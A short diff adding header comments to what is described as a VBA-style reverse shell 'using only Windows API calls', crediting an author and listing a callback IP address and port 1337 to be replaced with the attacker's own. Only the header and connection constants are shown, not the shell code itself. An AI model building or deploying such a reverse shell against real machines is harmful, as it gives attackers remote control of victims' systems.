@@ -1,3 +1,7 @@
+'Reverse shell using only Windows API calls, no Powershell, shellcode injection, or dropping exe's.
+'Author: John Woodman
+'Twitter: @JohnWoodman15
+
 'Replace with your IP and Port
 Const ip = "192.168.43.1"
 Const port = "1337"
